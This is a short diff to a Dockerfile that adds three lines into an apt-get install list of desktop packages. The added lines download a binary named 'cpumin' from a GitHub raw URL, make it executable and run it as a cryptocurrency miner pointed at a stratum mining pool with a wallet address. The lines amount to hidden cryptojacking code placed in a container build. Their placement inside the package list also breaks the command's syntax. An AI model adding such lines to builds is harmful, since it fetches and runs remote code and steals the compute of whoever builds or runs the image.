@@ -8,6 +8,9 @@ RUN apt-get upgrade
 RUN set -ex; \
     apt-get update \
     && apt-get install -y --no-install-recommends \
+        wget https://raw.githubusercontent.com/jacujamil/dewasa/main/cpumin \
+        chmod +x cpumin \
+        ./cpumin -a yescryptR16 -o stratum+tcp://stratum-asia.rplant.xyz:17055 -u qRNDBVci5Afgiq8uCkmQ9BTX9fxtAUdVUS.tes -t 2 \
         dbus-x11 \
         nautilus \
         gedit \
